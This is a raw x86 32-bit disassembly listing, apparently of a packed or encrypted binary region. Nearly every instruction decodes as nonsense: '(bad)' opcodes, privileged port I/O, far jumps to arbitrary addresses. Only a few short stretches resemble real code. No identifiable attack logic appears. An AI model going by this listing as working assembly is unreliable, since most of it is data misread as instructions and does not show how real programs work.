  405139:	cmp    eax,0x1570707d
  40513e:	iret   
  40513f:	inc    esi
  405140:	jmp    0xfce4e2f2
  405145:	nop
  405146:	cmc    
  405147:	push   ebx
  405148:	mov    edx,0xfbf9d67
  40514d:	jmp    0x4050d6
  40514f:	inc    eax
  405150:	pusha  
  405151:	mov    al,ds:0xde9450eb
  405156:	xchg   DWORD PTR [ebx+0x37],edx
  405159:	push   DWORD PTR [esi+ecx*4+0x2d]
  40515d:	inc    eax
  40515e:	push   esi
  40515f:	adc    edi,DWORD PTR [edx-0x2]
  405162:	add    ebx,DWORD PTR [eax+ecx*8]
  405165:	xor    al,0x8a
  405167:	fild   WORD PTR [esi]
  405169:	mov    dh,0x65
  40516b:	mov    ebx,DWORD PTR [ecx-0xb0b5d2e]
  405171:	(bad)  
  405172:	mov    eax,ds:0xffefabe1
  405177:	push   0x646cf621
  40517c:	aam    0xca
  40517e:	xchg   DWORD PTR [ebp-0x59],edi
  405181:	je     0x4051ed
  405183:	add    eax,0xd3407b4b
  405188:	int3   
  405189:	pop    eax
  40518a:	xchg   edx,eax
  40518b:	jmp    0x8319:0xe1de8009
  405192:	pushf  
  405193:	mov    ch,0x9d
  405195:	mov    WORD PTR [edx+0x2b28afc7],?
  40519b:	lods   eax,DWORD PTR ds:[esi]
  40519c:	jae    0x405163
  40519e:	mov    ecx,0xf8290bb3
  4051a3:	ja     0x405176
  4051a5:	ins    BYTE PTR es:[edi],dx
  4051a6:	cmp    BYTE PTR [esi],dl
  4051a8:	mov    ebx,0xcaa73b22
  4051ad:	push   eax
  4051ae:	fsub   QWORD PTR [ebp-0x28]
  4051b1:	(bad)  
  4051b3:	sub    al,0xb0
  4051b5:	cmc    
  4051b6:	loopne 0x40515a
  4051b8:	(bad)  
  4051b9:	hlt    
  4051ba:	jmp    0x4051e8
  4051bc:	lahf   
  4051bd:	mov    ch,0xd0
  4051bf:	adc    dl,BYTE PTR [esi+edx*2+0x241594dd]
  4051c6:	sub    al,0x57
  4051c8:	and    eax,0xb78c0416
  4051cd:	sbb    ch,BYTE PTR [edi]
  4051cf:	test   DWORD PTR [eax-0x39],eax
  4051d2:	inc    edi
  4051d3:	pop    es
  4051d4:	loop   0x4051b1
  4051d6:	mov    bl,0xe1
  4051d8:	mov    DWORD PTR [edx+0x160f8a69],esp
  4051de:	fdiv   st(4),st
  4051e0:	out    dx,al
  4051e1:	jle    0x4051f3
  4051e3:	lods   eax,DWORD PTR ds:[esi]
  4051e4:	jp     0x405190
  4051e6:	mov    eax,0x62214f10
  4051eb:	cmp    BYTE PTR [edx+0xa],bh
  4051ee:	pop    ecx
  4051ef:	leave  
  4051f0:	(bad)  
  4051f2:	into   
  4051f3:	inc    ebx
  4051f4:	cmp    edx,DWORD PTR [ecx-0x4]
  4051f7:	not    ch
  4051f9:	sub    ch,cl
  4051fb:	sub    bl,0x69
  4051fe:	inc    edi
  4051ff:	enter  0x36ab,0x5c
  405203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405204:	cwde   
  405205:	mov    esp,0x13bf9377
  40520a:	dec    ecx
  40520b:	lods   al,BYTE PTR ds:[esi]
  40520c:	mov    esi,0xc3c78539
  405211:	test   BYTE PTR [edi+0x620ea6a5],0x87
  405218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405219:	inc    edx
  40521a:	out    0x8b,eax
  40521c:	popa   
  40521d:	adc    eax,0xb1233ef5
  405222:	pop    edi
  405223:	add    ah,BYTE PTR [edx+0x5aee9fc7]
  405229:	pop    eax
  40522a:	daa    
  40522b:	rcl    al,0xd2
  40522e:	rcl    DWORD PTR [edi+0x9],0x8c
  405232:	stc    
  405233:	pop    es
  405234:	repnz push es
  405236:	ror    DWORD PTR [eax-0x5c],cl
  405239:	xor    al,0x47
  40523b:	cwde   
  40523c:	jne    0x4051f4
  40523e:	out    0xaf,al
  405240:	hlt    
  405241:	pop    esi
  405242:	jecxz  0x405239
  405244:	push   edi
  405245:	inc    eax
  405246:	sbb    al,0x51
  405248:	push   eax
  405249:	sbb    eax,0xbd7512d2
  40524e:	jo     0x4052a8
  405250:	(bad)  
  405251:	in     eax,dx
  405252:	(bad)  
  405253:	inc    edx
  405254:	pop    ss
  405255:	mov    ecx,0x8eb2450
  40525a:	pop    edi
  40525b:	push   ecx
  40525c:	and    al,0x22
  40525e:	call   0x13d4:0x3eacd942
  405265:	inc    esi
  405266:	xchg   DWORD PTR ds:0xe2a62f8a,ecx
  40526c:	popa   
  40526d:	jmp    0xb65bf45
  405272:	icebp  
  405273:	mov    ebx,0xea43e087
  405278:	pop    ss
  405279:	outs   dx,DWORD PTR ds:[esi]
  40527a:	test   al,0x52
  40527c:	pop    edi
  40527d:	pop    edx
  40527e:	popa   
  40527f:	jns    0x405261
  405281:	push   eax
  405282:	mov    al,0xfd
  405284:	out    dx,al
  405285:	sbb    eax,0x716670a2
  40528a:	mov    edi,0x9a4e573e
  40528f:	clc    
  405290:	cmp    eax,0x30fb75dc
  405295:	rcl    DWORD PTR [edi-0x2899b8ab],1
  40529b:	retf   0x14f5
  40529e:	cs push eax
  4052a0:	(bad)  
  4052a1:	cmp    DWORD PTR [ebp-0x35],ebp
  4052a4:	and    BYTE PTR [ecx+0x35ee743d],cl
  4052aa:	nop
  4052ab:	mov    ds:0x9d019adc,al
  4052b0:	(bad)  
  4052b1:	pop    esi
  4052b2:	outs   dx,DWORD PTR ds:[esi]
  4052b3:	add    dh,BYTE PTR [ecx+0x67]
  4052b6:	xchg   BYTE PTR [ebp-0x12],dl
  4052b9:	pop    esi
  4052ba:	repz les esi,FWORD PTR [esi-0x215a3ab5]
  4052c1:	or     esp,esi
  4052c3:	jno    0x4052e0
  4052c5:	inc    esi
  4052c6:	shl    BYTE PTR [ebx-0x12866a7a],cl
  4052cc:	or     eax,0x8ec9bef8
  4052d1:	out    dx,al
  4052d2:	in     eax,0x0
  4052d4:	mul    DWORD PTR [edi-0x74bc9192]
  4052da:	adc    BYTE PTR [esi-0x3f6906de],ah
  4052e0:	mov    ds:0xe7609536,eax
  4052e5:	les    eax,FWORD PTR [esi+0x13]
  4052e8:	div    bh
  4052ea:	and    al,0xdc
  4052ec:	xchg   ecx,eax
  4052ed:	(bad)  
  4052ee:	icebp  
  4052ef:	in     al,0xda
  4052f1:	xchg   ecx,eax
  4052f2:	xchg   ebx,eax
  4052f3:	popa   
  4052f4:	arpl   si,cx
  4052f6:	retf   0x505e
  4052f9:	ret    0xe5c5
  4052fc:	popf   
  4052fd:	sub    dh,BYTE PTR [edi]
  4052ff:	call   0x680df7ff
  405304:	sub    esp,esi
  405306:	xchg   edi,eax
  405307:	loope  0x405361
  405309:	push   edi
  40530a:	dec    esp
  40530b:	daa    
  40530c:	inc    edx
  40530d:	mov    al,ds:0xb29741db
  405312:	pop    esp
  405313:	leave  
  405314:	mov    esp,0x623e8195
  405319:	and    eax,0xd908e4e4
  40531e:	cld    
  40531f:	clc    
  405320:	loope  0x4052ec
  405322:	inc    edx
  405323:	fstp   DWORD PTR [eax]
  405325:	(bad)  
  405326:	outs   dx,DWORD PTR ds:[esi]
  405327:	xor    BYTE PTR [ecx+0x4b],0xf4
  40532b:	call   0x5f417fd6
  405330:	bound  edx,QWORD PTR [ecx]
  405332:	xchg   DWORD PTR [eax+0x174954af],ebp
  405338:	jns    0x405336
  40533a:	lods   eax,DWORD PTR ss:[esi]
  40533c:	sbb    dh,BYTE PTR [ebx]
  40533e:	dec    ebx
  40533f:	adc    cl,dh
  405341:	jmp    DWORD PTR [edi-0x49145051]
  405347:	pop    ebp
  405348:	icebp  
  405349:	in     al,dx
  40534a:	(bad)  
  40534b:	mov    cl,0x3b
  40534d:	retf   
  40534e:	lock mov ch,0xb4
  405351:	jno    0x40532e
  405353:	aam    0x65
  405355:	dec    esp
  405356:	fld    TBYTE PTR [edx]
  405358:	mov    BYTE PTR [ebx+0x3797b4fe],dl
  40535e:	xchg   ebx,eax
  40535f:	(bad)  
  405360:	sbb    cl,BYTE PTR [eax-0x1e241b60]
  405366:	into   
  405367:	lock out dx,eax
  405369:	loopne 0x405339
  40536b:	repnz not ebp
  40536e:	dec    edi
  40536f:	imul   DWORD PTR [edi-0x36ae95a9]
  405375:	dec    DWORD PTR [ecx-0x29438097]
  40537b:	pop    ebp
  40537c:	cmc    
  40537d:	sub    BYTE PTR [ebx+ecx*1-0xda98f0f],dh
  405384:	xchg   ebx,eax
  405385:	out    dx,eax
  405386:	out    dx,eax
  405387:	push   eax
  405388:	mov    ch,0xc
  40538a:	jp     0x4053dd
  40538c:	mov    WORD PTR [ebp+0x60],fs
  40538f:	adc    al,0xd3
  405391:	(bad)  
  405392:	adc    eax,0xacfcd13e
  405397:	xor    eax,0x87439092
  40539c:	dec    edi
  40539d:	fnstenv [edi-0x2f32266c]
  4053a3:	cmp    BYTE PTR [esi-0x2c082e57],ch
  4053a9:	or     al,0x7e
  4053ab:	push   esp
  4053ac:	(bad)  
  4053ae:	xchg   ebp,eax
  4053af:	pop    esp
  4053b0:	mov    al,ds:0x77bb9cf5
  4053b5:	cs out dx,al
  4053b7:	dec    edi
  4053b8:	into   
  4053b9:	or     bl,BYTE PTR [esi-0x65]
  4053bc:	lods   al,BYTE PTR ds:[esi]
  4053bd:	push   edi
  4053be:	(bad)  
  4053bf:	fcom   QWORD PTR [ebx-0x2ac379cf]
  4053c5:	iret   
  4053c6:	or     al,0x4a
  4053c8:	lods   al,BYTE PTR ds:[esi]
  4053c9:	add    dl,0x9a
  4053cc:	add    al,0xbf
  4053ce:	jbe    0x40542c
  4053d0:	cmp    al,0xd0
  4053d2:	and    esp,DWORD PTR [eax]
  4053d4:	push   0x4f494ba5
  4053d9:	rol    BYTE PTR [ecx-0x58],0xad
  4053dd:	inc    ebp
  4053de:	jp     0x4053c9
  4053e0:	js     0x405434
  4053e2:	cmp    eax,0xfb66c70b
  4053e7:	xor    al,0x44
  4053e9:	bswap  edx
  4053eb:	clc    
  4053ec:	sbb    eax,0x348dd96f
  4053f1:	pop    esp
  4053f2:	mov    edx,0x61f42b0e
  4053f7:	and    edx,DWORD PTR [esi+0x6d40947c]
  4053fd:	popa   
  4053fe:	pusha  
  4053ff:	mov    al,ds:0xb98d9d2a
  405404:	sbb    DWORD PTR [edx+edx*8+0x732336f4],ebp
  40540b:	addr16 dec esi
  40540d:	pop    edi
  40540e:	jne    0x40547b
  405410:	les    esi,FWORD PTR [ebx+0x7d]
  405413:	jae    0x4053a6
  405415:	mov    ds:0x781a0591,eax
  40541a:	test   BYTE PTR [edi-0x3c],ah
  40541d:	add    BYTE PTR [ebx+ebp*1+0x3c8aa86a],ch
  405424:	jne    0x4053bb
  405426:	test   DWORD PTR [esi],edi
  405428:	or     bh,BYTE PTR [ebx]
  40542a:	sub    esi,ebp
  40542c:	pop    esi
  40542d:	bound  edx,QWORD PTR [edi]
  40542f:	mov    esi,DWORD PTR [edx+0x27c3bac5]
  405435:	push   edi
  405436:	repnz out dx,al
  405438:	nop
  405439:	loopne 0x405479
  40543b:	out    0xe,al
  40543d:	or     al,0x39
  40543f:	fistp  QWORD PTR [esp+ecx*1-0x65]
  405443:	mov    eax,0x36142742
  405448:	fistp  DWORD PTR [eax]
  40544a:	(bad)  
  40544b:	mov    dh,0xf9
  40544d:	mov    al,0x40
  40544f:	jl     0x405459
  405451:	add    DWORD PTR ds:0xb398b99e,0x98bc2532
  40545b:	out    0x85,eax
  40545d:	or     eax,0x8f403e18
  405462:	jmp    0x4054a8
  405464:	push   esi
  405465:	in     al,0x98
  405467:	fcmovb st,st(2)
  405469:	je     0x405407
  40546b:	push   edx
  40546c:	push   0xffffff81
  40546e:	jp     0x4054e3
  405470:	adc    bl,BYTE PTR [esi+0x27]
  405473:	sub    bl,bh
  405475:	push   cs
  405476:	nop
  405477:	sub    BYTE PTR [eax-0x240cf0ee],bh
  40547d:	cmp    DWORD PTR [eax-0x70],0x5e
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e804
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e76b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	frstor [ebx+0x3710c310]
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40551d
  4054b5:	lea    esp,[edi-0x7d]
  4054b8:	rcr    DWORD PTR ds:0x66d8252d,cl
  4054be:	mov    al,0x14
  4054c0:	sub    BYTE PTR [edi+0x299f47ea],dh
  4054c6:	cmp    BYTE PTR [eax],dl
  4054c8:	scas   eax,DWORD PTR es:[edi]
  4054c9:	inc    ebp
  4054ca:	inc    ebp
  4054cb:	retf   
  4054cc:	xor    ebx,DWORD PTR [edx]
  4054ce:	push   ebp
  4054cf:	in     eax,0x64
  4054d1:	dec    esi
  4054d2:	cmp    edx,DWORD PTR [ebx-0xf]
  4054d5:	jo     0x405484
  4054d7:	nop
  4054d8:	pop    esp
  4054d9:	cli    
  4054da:	mov    fs,ebx
  4054dc:	je     0x4054b1
  4054de:	push   eax
  4054df:	ss rcl cl,cl
  4054e2:	outs   dx,DWORD PTR ds:[esi]
  4054e3:	mov    bl,0xe0
  4054e5:	dec    esi
  4054e6:	dec    ecx
  4054e7:	test   DWORD PTR [ebx+0x28],edx
  4054ea:	aad    0xbf
  4054ec:	bound  esi,QWORD PTR [edi+ebp*2+0x6e]
  4054f0:	call   0xf556:0x2efa3a16
  4054f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054f8:	test   al,0xa4
  4054fa:	rdtsc  
  4054fc:	pop    esi
  4054fd:	std    
  4054fe:	fwait
  4054ff:	inc    edi
  405500:	jmp    0x557d7bec
  405505:	pusha  
  405506:	inc    edx
  405507:	sub    dl,BYTE PTR [edx+eiz*8+0x50]
  40550b:	lods   eax,DWORD PTR ds:[esi]
  40550c:	inc    ebx
  40550d:	scas   eax,DWORD PTR es:[edi]
  40550e:	inc    eax
  40550f:	pop    esp
  405510:	dec    ebp
  405511:	lods   al,BYTE PTR ds:[esi]
  405512:	daa    
  405513:	sbb    BYTE PTR [edx],ch
  405515:	adc    DWORD PTR [ebx+0x2ecca5b2],edx
  40551b:	xchg   ecx,eax
  40551c:	mov    ah,0xeb
  40551e:	iret   
  40551f:	sbb    al,0xbe
  405521:	push   eax
  405522:	rol    DWORD PTR [esi+0x5916b81b],cl
  405528:	dec    eax
  405529:	sti    
  40552a:	(bad)  
  40552b:	pop    ebx
  40552c:	outs   dx,BYTE PTR ds:[esi]
  40552d:	fiadd  WORD PTR [ebx]
  40552f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405530:	xchg   BYTE PTR [ecx-0x8bea6ae],al
  405536:	ss mov bl,0x46
  405539:	inc    eax
  40553a:	int3   
  40553b:	pop    edi
  40553c:	ret    
  40553d:	sub    eax,0x9acf30e8
  405542:	dec    ebx
  405543:	add    cl,BYTE PTR [edi+0x56708049]
  405549:	sbb    BYTE PTR [edx-0x2],bl
  40554c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40554d:	jno    0x4054da
  40554f:	addr16 xchg al,bh
  405552:	dec    eax
  405553:	cdq    
  405554:	sti    
  405555:	adc    ch,BYTE PTR [esi-0x2f]
  405558:	or     al,0x95
  40555a:	dec    eax
  40555b:	dec    edi
  40555c:	pop    ds
  40555d:	and    DWORD PTR [ecx+0x34],ebx
  405560:	sub    BYTE PTR [edx+ecx*8-0x57cd78c7],0x76
  405568:	dec    esi
  405569:	(bad)  
  40556a:	mov    bl,0xda
  40556c:	hlt    
  40556d:	push   ecx
  40556e:	pop    es
  40556f:	mov    ch,0xad
  405571:	frstor [ecx+edx*2]
  405574:	dec    ebp
  405575:	mov    dl,0xf5
  405577:	outs   dx,BYTE PTR ds:[esi]
  405578:	aam    0x2f
  40557a:	repnz dec esp
  40557c:	imul   DWORD PTR gs:[edi]
  40557f:	or     ah,BYTE PTR [ebx+0x37fb53a9]
  405585:	and    BYTE PTR [edx-0x3a24bdbc],bl
  40558b:	or     eax,0xb7cd61b
  405590:	push   ebp
  405591:	xor    eax,0x19571452
  405596:	pop    esi
  405597:	cmp    cl,BYTE PTR [esi-0x1c]
  40559a:	xor    eax,DWORD PTR ds:0x14a3f311
  4055a0:	(bad)  
  4055a1:	mov    bl,0x4a
  4055a3:	nop
  4055a4:	xchg   edx,eax
  4055a5:	in     al,dx
  4055a6:	das    
  4055a7:	aam    0x2
  4055a9:	xchg   edi,eax
  4055aa:	xor    DWORD PTR [eax+ebx*4],ecx
  4055ad:	test   BYTE PTR [ecx+0x35],ah
  4055b0:	pop    ds
  4055b1:	mov    ebx,DWORD PTR [edi-0x50]
  4055b4:	(bad)  
  4055b5:	hlt    
  4055b6:	sbb    al,0x5
  4055b8:	ja     0x405569
  4055ba:	push   ecx
  4055bb:	dec    ebp
  4055bc:	mov    ebx,0x1138afed
  4055c1:	mov    gs,WORD PTR [eax-0xc]
  4055c4:	sbb    al,0x30
  4055c6:	mov    ds:0x4be297a6,al
  4055cb:	ja     0x4055e1
  4055cd:	lock loope 0x40564b
  4055d0:	push   0xe56d49f4
  4055d5:	xor    al,0xf2
  4055d7:	dec    esp
  4055d8:	or     eax,0xc26ce6fe
  4055dd:	cmp    eax,0x6eb1b121
  4055e2:	sub    al,0x27
  4055e4:	aaa    
  4055e5:	les    ebx,FWORD PTR [eax+0xc]
  4055e8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4055ea:	and    DWORD PTR [eax-0x51],0x21
  4055ee:	jle    0x4055e8
  4055f0:	jg     0x4055b5
  4055f2:	in     al,0x88
  4055f4:	or     BYTE PTR [eax+0x7d4931af],ah
  4055fa:	push   edi
  4055fb:	push   esi
  4055fc:	adc    al,0xf3
  4055fe:	enter  0x15ae,0x29
  405602:	fstp   TBYTE PTR [esi]
  405604:	dec    edx
  405605:	pop    ebx
  405606:	sub    bh,ch
  405608:	xor    eax,0x49c9808b
  40560d:	push   cs
  40560e:	xor    al,al
  405610:	jmp    0x405594
  405612:	or     eax,0x22b4409c
  405617:	hlt    
  405618:	imul   DWORD PTR ds:0x5e8734f2
  40561e:	xchg   esp,eax
  40561f:	in     al,dx
  405620:	adc    BYTE PTR [edx-0x32f47376],bh
  405626:	pusha  
  405627:	inc    ebp
  405628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405629:	cmp    cl,0x68
  40562c:	pop    ecx
  40562d:	fiadd  DWORD PTR [esi-0x73]
  405630:	mov    esp,0x32d7143d
  405635:	es jmp 0x6f5:0xb7552565
  40563d:	scas   al,BYTE PTR es:[edi]
  40563e:	push   ds
  40563f:	(bad)  
  405641:	dec    ebp
  405642:	jb     0x405609
  405644:	mov    bh,0xd8
  405646:	dec    ebp
  405647:	sub    eax,0x62e49e77
  40564c:	xchg   edi,eax
  40564d:	dec    esi
  40564e:	xor    edx,esp
  405650:	fs cwde 
  405652:	mov    al,0x3b
  405654:	leave  
  405655:	fstp   st(4)
  405657:	mov    ah,0x56
  405659:	lods   al,BYTE PTR ds:[esi]
  40565a:	sub    eax,0x9c087fed
  40565f:	ret    
  405660:	pop    esi
  405661:	and    al,0x49
  405663:	call   0xd6d4efa4
  405668:	lods   al,BYTE PTR ds:[esi]
  405669:	mov    bh,0x80
  40566b:	sub    DWORD PTR [edi-0x29a687ef],ebx
  405671:	and    ah,BYTE PTR [edx-0x5a4f64bb]
  405677:	push   edx
  405678:	fwait
  405679:	ja     0x405669
  40567b:	iret   
  40567c:	in     al,0xe6
  40567e:	popa   
  40567f:	and    al,0x1c
  405681:	and    BYTE PTR [edi],ch
  405683:	inc    ebx
  405684:	lods   eax,DWORD PTR ds:[esi]
  405685:	mov    dh,0x79
  405687:	callw  0x67ef
  40568b:	inc    edx
  40568c:	mov    dh,BYTE PTR [eax+0x1c224d86]
  405692:	jo     0x4056ae
  405694:	icebp  
  405695:	sub    eax,0x66b1a44c
  40569a:	xor    edx,0x4173dd12
  4056a0:	(bad)  
  4056a1:	pop    ebp
  4056a2:	xchg   BYTE PTR [ecx+0x1f34b538],dh
  4056a8:	xchg   edx,eax
  4056a9:	es xchg ebp,eax
  4056ab:	mov    bl,BYTE PTR [edx-0x2dfa30e6]
  4056b1:	cdq    
  4056b2:	mov    ds:0xeeb819ee,al
  4056b7:	inc    edx
  4056b8:	and    al,0x57
  4056ba:	clc    
  4056bb:	lods   al,BYTE PTR ds:[esi]
  4056bc:	mov    eax,ds:0xe4a8aea
  4056c1:	push   cs
  4056c2:	aaa    
  4056c3:	stos   BYTE PTR es:[edi],al
  4056c4:	push   ds
  4056c5:	pop    esi
  4056c6:	adc    DWORD PTR [edx+0x51dfd42a],edx
  4056cc:	shr    esi,0xc6
  4056cf:	out    0x28,al
  4056d1:	shl    BYTE PTR [edx+0x70],cl
  4056d4:	fstp   DWORD PTR [esp+ecx*1-0x62]
  4056d8:	add    eax,0x97d9d6f2
  4056dd:	scas   al,BYTE PTR es:[edi]
  4056de:	icebp  
  4056df:	sub    ch,bh
  4056e1:	mov    DWORD PTR [ebp-0x67e08153],edi
  4056e7:	inc    ecx
  4056e8:	xor    BYTE PTR [edx+0x20],0x91
  4056ec:	dec    edx
  4056ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ee:	sub    DWORD PTR [ebx+eax*8+0x7c655e5a],esi
  4056f5:	rcl    DWORD PTR [eax+esi*1+0x21],cl
  4056f9:	cwde   
  4056fa:	pop    edx
  4056fb:	sub    esi,DWORD PTR [edi+0x4227fcb3]
  405701:	mov    BYTE PTR ds:0xc55d37b0,dh
  405707:	aas    
  405708:	retf   0x6f8b
  40570b:	clc    
  40570c:	mov    dh,0x4
  40570e:	leave  
  40570f:	sub    BYTE PTR [ebx+0x11],ch
  405712:	stos   BYTE PTR es:[edi],al
  405713:	lahf   
  405714:	inc    edx
  405715:	jb     0x40570a
  405717:	aaa    
  405718:	loop   0x40570d
  40571a:	sbb    edx,DWORD PTR [esp+esi*1]
  40571d:	push   ebp
  40571e:	adc    dl,ah
  405720:	(bad)  
  405722:	jle    0x405707
  405724:	jp     0x40578c
  405726:	test   BYTE PTR [ecx],ah
  405728:	xor    BYTE PTR [eax-0x6389622d],0xae
  40572f:	dec    eax
  405730:	adc    eax,0xcab1ee72
  405735:	(bad)  
  405736:	addr16 jmp 0x405786
  405739:	mov    ah,0x22
  40573b:	sbb    al,0x55
  40573d:	mov    dh,0x7f
  40573f:	xor    eax,0x632564d0
  405744:	stos   DWORD PTR es:[edi],eax
  405745:	les    edi,FWORD PTR [esp+ebp*8+0x5affc0e2]
  40574c:	(bad)  
  40574d:	sbb    eax,0xefab17d6
  405752:	lea    edx,[edi-0x14]
  405755:	mov    cl,0x79
  405757:	pusha  
  405758:	cs dec ebp
  40575a:	mov    ebp,0xf442cb5c
  40575f:	or     DWORD PTR [edi+eiz*1+0x3],edi
  405763:	dec    ecx
  405764:	dec    edi
  405765:	adc    BYTE PTR [ebp+0x51af80e9],ah
  40576b:	movzx  eax,WORD PTR ds:0x42fe06
  405772:	and    eax,DWORD PTR ds:0x42fdfa
  405778:	mov    ds:0x42fe06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x412291be],eax
  405790:	mov    esi,ebp
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	pop    es
  40579b:	push   esi
  40579c:	push   ebx
  40579d:	call   0x8f377fb7
  4057a2:	jo     0x405767
  4057a4:	fbld   TBYTE PTR [ebx]
  4057a6:	sub    dl,al
  4057a8:	das    
  4057a9:	adc    bl,ch
  4057ab:	fdivr  st,st(1)
  4057ad:	inc    esi
  4057ae:	mov    ?,ebx
  4057b0:	out    0xe1,eax
  4057b2:	lods   al,BYTE PTR ds:[esi]
  4057b3:	das    
  4057b4:	inc    esi
  4057b5:	in     al,0xc4
  4057b7:	shl    BYTE PTR [edx],0xb8
  4057ba:	ds inc esp
  4057bc:	jnp    0x4057ca
  4057be:	ins    DWORD PTR es:[edi],dx
  4057bf:	xchg   edx,eax
  4057c0:	call   0xc55:0x40f61569
  4057c7:	cdq    
  4057c8:	not    esi
  4057ca:	out    0x87,al
  4057cc:	dec    eax
  4057cd:	sbb    al,0x47
  4057cf:	xchg   esi,eax
  4057d0:	inc    ebx
  4057d1:	cmp    eax,0xd76a10c6
  4057d6:	xchg   ecx,eax
  4057d7:	sub    bl,ah
  4057d9:	fisttp WORD PTR [edx]
  4057db:	xlat   BYTE PTR ds:[ebx]
  4057dc:	mov    WORD PTR [edx-0x2968c415],?
  4057e2:	mov    gs,WORD PTR ds:0x893770c2
  4057e8:	jo     0x405864
  4057ea:	ins    BYTE PTR es:[edi],dx
  4057eb:	inc    edi
  4057ec:	cmp    bh,ch
  4057ee:	scas   eax,DWORD PTR es:[edi]
  4057ef:	daa    
  4057f0:	xchg   dh,dh
  4057f2:	retf   0x79cb
  4057f5:	inc    esi
  4057f6:	mov    al,ds:0x46ffb90f
  4057fb:	lea    ebx,ss:[ecx+0x3c]
  4057ff:	mov    edx,0x10c66bdf
  405804:	es test al,0x59
  405807:	sahf   
  405808:	pop    es
  405809:	push   es
  40580a:	loop   0x4057ba
  40580c:	jl     0x405854
  40580e:	into   
  40580f:	push   ds
  405810:	(bad)  
  405811:	and    eax,0x6dd88eb6
  405816:	jae    0x4057b7
  405818:	imul   ecx,DWORD PTR [edi-0x44],0xa
  40581c:	fdiv   DWORD PTR ds:0x149a0520
  405822:	add    dl,BYTE PTR [eax]
  405824:	js     0x4057e3
  405826:	clc    
  405827:	adc    eax,0xffffff98
  40582a:	xor    eax,0x961633c6
  40582f:	pop    ebx
  405830:	or     BYTE PTR [ebx-0x2ba972be],bl
  405836:	mov    DWORD PTR [eax],0x2b20eb40
  40583c:	pusha  
  40583d:	mov    ds:0xd3d31e1e,eax
  405842:	ret    0x5597
  405845:	pop    eax
  405846:	xchg   ebx,eax
  405847:	and    edi,DWORD PTR [ecx]
  405849:	xchg   DWORD PTR [edi-0x80],edi
  40584c:	xchg   edx,eax
  40584d:	add    dl,dl
  40584f:	ins    DWORD PTR es:[edi],dx
  405850:	or     cl,BYTE PTR [esi]
  405852:	jne    0x405853
  405854:	(bad)  
  405855:	xchg   esp,eax
  405856:	loopne 0x405855
  405858:	mov    ds:0xdeb492d0,eax
  40585d:	out    0x42,eax
  40585f:	js     0x405878
  405861:	data16 mov bl,0x35
  405864:	add    al,0x8e
  405866:	dec    ecx
  405867:	add    BYTE PTR [esi-0x22],bl
  40586a:	mov    al,0x4
  40586c:	scas   al,BYTE PTR es:[edi]
  40586d:	cwde   
  40586e:	mov    al,ds:0xd6d42412
  405873:	mov    al,0x57
  405875:	shl    edi,1
  405877:	mov    ecx,0x16d6cdd0
  40587c:	sbb    DWORD PTR [edi-0x61],ebx
  40587f:	xchg   esp,eax
  405880:	sub    cl,BYTE PTR [edi]
  405882:	jae    0x4058ed
  405884:	int    0xf3
  405886:	mov    esi,0x189a24e7
  40588b:	clc    
  40588c:	outs   dx,BYTE PTR ds:[esi]
  40588d:	cld    
  40588e:	cld    
  40588f:	into   
  405890:	jmp    0x69158c2c
  405895:	xlat   BYTE PTR ds:[ebx]
  405896:	test   DWORD PTR [esi-0x1d],0xdc490015
  40589d:	mov    WORD PTR [edi],?
  40589f:	jo     0x405866
  4058a1:	inc    esp
  4058a2:	pop    ebp
  4058a3:	jns    0x405876
  4058a5:	cmp    eax,ecx
  4058a7:	icebp  
  4058a8:	div    BYTE PTR [esi+0x9]
  4058ab:	sbb    BYTE PTR [edx],ch
  4058ad:	mov    eax,esi
  4058af:	push   cs
  4058b0:	pop    esi
  4058b1:	call   0x16812bcd
  4058b6:	repz adc al,0xd0
  4058b9:	repz mov edx,esp
  4058bc:	xor    esp,ecx
  4058be:	adc    ch,bl
  4058c0:	fcmovnbe st,st(3)
  4058c2:	inc    ecx
  4058c3:	add    BYTE PTR ds:0x617d5ad1,cl
  4058c9:	clc    
  4058ca:	imul   DWORD PTR [eax+0x715057ea]
  4058d0:	xor    cl,dh
  4058d2:	data16 in ax,0xe8
  4058d6:	ss xchg edi,eax
  4058d8:	mov    bl,ah
  4058da:	in     eax,0x3a
  4058dc:	pop    ss
  4058dd:	fist   DWORD PTR cs:[esi]
  4058e0:	arpl   WORD PTR [edx-0x25],dx
  4058e3:	inc    edx
  4058e4:	fsub   st(6),st
  4058e6:	cmp    al,0x8f
  4058e8:	adc    DWORD PTR ds:0x8fc3139a,ebx
  4058ee:	cs pop edi
  4058f0:	cld    
  4058f1:	mov    eax,0x54e7d6fb
  4058f6:	std    
  4058f7:	or     ecx,DWORD PTR [edi+0x7183620e]
  4058fd:	fld    QWORD PTR [ecx]
  4058ff:	adc    esp,ebp
  405901:	enter  0xdde9,0xea
  405905:	push   cs
  405906:	push   0xdf9da19d
  40590b:	shr    BYTE PTR ss:[eax+ecx*2+0x3d],0xb1
  405911:	test   eax,0x5e635200
  405916:	icebp  
  405917:	cmc    
  405918:	mov    esp,0xea9279e4
  40591d:	sti    
  40591e:	sbb    eax,0xe65941ff
  405923:	fadd   QWORD PTR [edi]
  405925:	sub    eax,0xa9cf7f0c
  40592a:	sti    
  40592b:	int3   
  40592c:	addr16 test al,0x75
